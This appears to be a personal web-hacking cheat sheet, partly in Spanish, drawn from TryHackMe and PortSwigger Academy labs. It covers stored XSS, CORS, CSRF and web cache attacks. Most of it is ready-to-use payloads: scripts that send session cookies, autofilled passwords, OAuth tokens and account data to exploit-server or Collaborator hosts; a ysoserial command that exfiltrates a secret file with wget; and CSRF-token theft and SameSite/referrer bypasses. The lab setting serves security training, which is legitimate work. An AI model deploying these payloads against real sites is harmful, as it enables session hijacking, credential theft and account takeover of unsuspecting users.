As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.  
  
**Example Scenario:**  
  
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png)  

  

**Potential Impact:**  
  
The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

**How to test for Stored XSS:**  

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:  

- Comments on a blog
- User profile information  
    
- Website Listings  
    

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected

Example: 
1. If in a post you found that any part of your post is placed as a value of a href, you can execute JavaScripts commands like this one: javascript:alert(1)
   
   
   STEAL COOKIES XSS
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit'+document.cookie</script>

<script>
document.location="ORIGINAL-SEARCH=%22-eval(atob('YOUR-EXPLOIT-DOMAIN-IN-BASE64'))-%22436280";
</script>

<script>
document.location="https://0ac8009503a4bd76802403fd00c000e9.web-security-academy.net/?find="}; location="https://exploit-0a29003e03cabd5b80f4024f0112008c.exploit-server.net/c?"+document['cookie'];//;
</script>

<script>
location="https://0a9b005604e619f4805203a10018003e.web-security-academy.net/?find=%22%7D%3Blocation%3D%22https%3A%2F%2Fexploit-0a3c0074047519e6808c02fb012400d9.exploit-server.net%2F%3Fc%3D%22%2Bdocument.cookie%3B%2F%2F";
</script>

"};location="https://exploit-0a3c0074047519e6808c02fb012400d9.exploit-server.net/?c="+document.cookie;//

The Exploit domain is in this format
fetch('https://exploit-0aac00b50328070f80020233018600e1.exploit-server.net/exploit?c='+document.cookie)

fetch("https://exploit-0a29003e03cabd5b80f4024f0112008c.exploit-server.net/?c="+btoa(document['cookie']))

Cuando no tenemos el server de burp o el collaborator, podemos hacer un script mas complejo que haga que la victima haga un post con los datos que necesitamos

<script>
window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 8);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'z3nsh3ll@googlemail.com');
    data.append('website', 'http://www.zenshell.ninja');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>

Steal OAuth Bearer Token

Hello, world!
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0aa000db03eaf7d2809101fa02640025.oauth-server.net/auth?client_id=b4osalp8id4xmp2unubjp&redirect_uri=https://0a6a00cd031af731807903ea00f70040.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aff002f030df7088033024a01fc001a.exploit-server.net/exploit&response_type=token&nonce=-306045060&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

"-alert`1`-"

java 

/home/lordfrodo/Downloads/ysoserial-all.jar 

CommonsCollections1 '/usr/bin/wget --post-file /home/carlos/secret https://abpyl1qymxgs5n5vv36qknv1rsxjl99y.oastify.com'


If you find an SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.

## web cache deception
<script>document.location="https://0ac300d00301eb1580e6538900b40080.web-security-academy.net/my-account/wscd.js"</script>

<script>document.location="https://0a5f002803ea6c8280a0122b005f00cf.web-security-academy.net/my-account;acd.js"</script>

<script>document.location="https://0a6e00fb0387104180c194ac00b00076.web-security-academy.net/resources/..%2fmy-account?wcd"</script>

<script>document.location="https://0a3e001d044e7fee81f91bbe005e00a4.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>


# Web cache poisoning

/?cb='/><script>alert(1)</script>




</script><script>alert(1)</script>
`';alert(document.domain)//`

gets converted to:

`\';alert(document.domain)//`

You can now use the alternative payload:

`\';alert(document.domain)//`

which gets converted to:

`\\';alert(document.domain)//`


http://foo?&apos;-alert(1)-&apos;
&APOS;  is a html encoded thats mean " ' " and with this, we can inject js code to achieve a xss

## LITERAL TEMPLATE

This bypass only works if the system is using a template literal in javascript (this type of strings: `lorem ipsum`) if you detected user this payload as your base to exploit it

${alert(1)}


## Steal Passwords
This one it can be used in posts for websites that automatically fills the password and username inputs:

<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">


## CSRS Bypass
This payload can be used to bypass a CSRF defense to exploit a XSS. We extract the CSRF token to achieve a successful post request from the victim. Lets check it out:

<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>


## CORS VULS

Always to check a CORS vul try these steps:
1. Add a origin with any website (with https an without)
2. Try a null origin
3. Try an origin using all the base website as your subdomain
4. Try using a random subdomain

To Exploit a CORS vulnerability (You can detect if is vulnerable if some response has this headers:  `Access-Control-Allow-Origin: https://malicious-website.com`
O `Access-Control-Allow-Credentials: true`), but to exploit it, it has to be twice in the response. Now you can use this payload:

<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+this.responseText; }; </script>

This is another example but for null origins (you can use srcdoc or src="data:text/html,):

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>


If you find a websites that is vulnerable to any subdomain, now, you have to find a vulnerable subdomain in use. In this case, this subdomain is vulnerable to XSS in "ProductId", so, we use this script to web the vulnerable request and with this request, we made a XSS to consume the path with the sensitive information. Lets check it out the payload:

<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>


## CSRF

Steps to test:
1. Remove the CSRF token and see if the app accepts the request
2. Change the request method from POST to GET
3. See if CSRF token is tied to user session
Steps to test CSRF tokens and CSRF Cookies:

4. Check if the CSRF token is tied to the CSRF Cookie
	1. Submit an invalid CSRF token
	2. Submit a valid CSRF token from another user
5. Submit valid CSRF token and cookie from another user
In this ones we had to make a HTTP Header injection check this example: 
         <img src="https://0ad40047030693bd83a8d2e000cb00a8.web-security-academy.net/?search=search%0d%0aSet-Cookie:%20csrf=T1MnzirNE6DONLUdOtCs6FKMnFWhoW5m%3b%20SameSite=None" onerror="document.forms[0].submit()">

If the page has set the SameSite cookies in Lax configuration (usually by default), you can try to change the request method and add a field to change when the request is running, look at this example:

     document.location="https://0afb001d04db23d480550de400240011.web-security-academy.net/my-account/change-email?email=a22%40a.com&_method=POST"

If the page has set the SameSite cookies in Strict configuration (usually by default), you need to find a request that can be exploitable with a path traversal or something to achieve the request we are looking for. In this case the request after we made a post has a JS to redirect to the path that we pass in the url, look at this example to exploit:

<script>
    document.location = "https://0a96000403bad75680bd0d3500730034.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>

If you have a CSRF  vul in a OAUTH login, you can try this payload. This payload ensure to refresh the session and exploit the vulnerability after the session has been refreshed, let's check it out: 
<form method="POST" action="https://0ad90024038e9c87807ff9b600510025.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwne1d@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0ad90024038e9c87807ff9b600510025.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>

If the page is vulnerable to CSRF but makes the validation by referrer header, you always can try to remove it and add the function to dont send it in your script with these lines:

<head>
    <meta name="referrer" content="never">
</head>  

If the page is vulnerable to CSRF but makes the validation by referrer header, you always can try to remove it, but if it doesn't work, try to check which part of the referrer has been validated, this is a payload when the server only check thats the base url exists in the referrer. You need to modify this section of your payload generated by burpsuite:

`history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")`

And add this header in your exploit server:
`Referrer-Policy: unsafe-url`



